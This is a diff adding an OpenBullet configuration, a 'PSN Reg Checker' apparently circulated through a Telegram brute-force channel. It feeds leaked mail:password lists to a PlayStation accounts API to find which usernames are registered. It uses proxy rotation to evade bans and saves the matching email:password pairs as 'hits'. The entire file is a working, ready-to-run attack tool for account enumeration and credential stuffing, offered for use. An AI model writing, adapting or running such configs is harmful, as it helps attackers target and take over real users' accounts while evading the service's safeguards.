@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "PSN Reg Checker",
+  "SuggestedBots": 20,
+  "MaxCPM": 50,
+  "LastModified": "2020-10-06T20:51:03.5104594+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Save Hits Text File on OpenBullet Root Folder | CPM Rate: 10-100",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn & @LilToba",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 3,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var g1 = uuidv4();
+END SCRIPT -> VARS "g1"
+
+#US FUNCTION Replace "@.*" "" UseRegex=TRUE "<USER>" -> VAR "US" 
+
+#Post REQUEST POST "https://accounts.api.playstation.com/api/v1/accounts/onlineIds" AutoRedirect=FALSE 
+  CONTENT "{\"onlineId\":\"<US>\",\"reserveIfAvailable\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/create_account/?entry=%2Fcreate_account&tp_psn=true&ui=pr&client_id=<g1>&redirect_uri=https://secure.eu.playstation.com/psnauth/PSNOAUTHResponse/pdc/&request_locale=en_US&response_type=code&scope=psn:s2s&service_entity=urn:service-entity:psn&service_logo=ps" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"expirationDate\":\"" 
+    KEY "string is too long" 
+  KEYCHAIN Success OR 
+    KEY "Account with this online id already exists" 
+    KEY "\"code\":\"3101\"" 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+
+#SSS UTILITY File "PSN Reg .txt" AppendLines "<USER>:<PASS>" -> VAR "SSS" 
+
